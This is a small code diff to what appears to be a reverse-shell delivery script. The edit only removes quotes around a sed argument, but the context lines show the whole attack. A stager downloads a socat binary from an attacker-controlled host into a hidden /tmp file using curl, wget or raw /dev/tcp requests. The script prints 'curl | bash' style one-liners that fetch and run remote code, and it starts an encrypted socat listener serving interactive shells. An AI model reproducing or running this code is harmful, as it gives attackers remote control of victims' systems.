@@ -73,7 +73,7 @@ cat > ${TEMP}/index.html << EOF
 cd /tmp
 curl ${LHOST}:${WEBPORT}/socat -o .lbskcn
 if [ ! -e .lbskcn ]; then wget ${LHOST}:${WEBPORT}/socat -O .lbskcn; fi
-if [ ! -e .lbskcn ]; then exec 3<>/dev/tcp/${LHOST}/${WEBPORT}; echo -e "GET /socat HTTP/1.1\r\nhost: ${LHOST}\r\nConnection: close\r\n\r\n" >&3; cat <&3 | sed -e '1,7d' > .lbskcn; fi
+if [ ! -e .lbskcn ]; then exec 3<>/dev/tcp/${LHOST}/${WEBPORT}; echo -e "GET /socat HTTP/1.1\r\nhost: ${LHOST}\r\nConnection: close\r\n\r\n" >&3; cat <&3 | sed -e 1,7d > .lbskcn; fi
 
 chmod +x .lbskcn
 if ! command -v bash 2>&1; then
@@ -93,6 +93,6 @@ if [[ "$WEBPORT" == 80 ]]; then echo "curl ${LHOST}|sh"; fi
 echo "curl ${LHOST}:${WEBPORT}|sh"
 echo "curl ${LHOST}:${WEBPORT}|bash"
 echo "wget -q -O - ${LHOST}:${WEBPORT}|bash"
-echo "exec 3<>/dev/tcp/${LHOST}/${WEBPORT}; echo -e \"GET / HTTP/1.1\r\nhost: ${LHOST}\r\nConnection: close\r\n\r\n\" >&3; cat <&3 | sed -e '1,7d' |bash"
+echo "exec 3<>/dev/tcp/${LHOST}/${WEBPORT}; echo -e \"GET / HTTP/1.1\r\nhost: ${LHOST}\r\nConnection: close\r\n\r\n\" >&3; cat <&3 | sed -e 1,7d |bash"
 
 socat OPENSSL-LISTEN:${LPORT},cert=server.pem,verify=0,reuseaddr,fork EXEC:./socat-forker.sh,pty,raw,echo=0
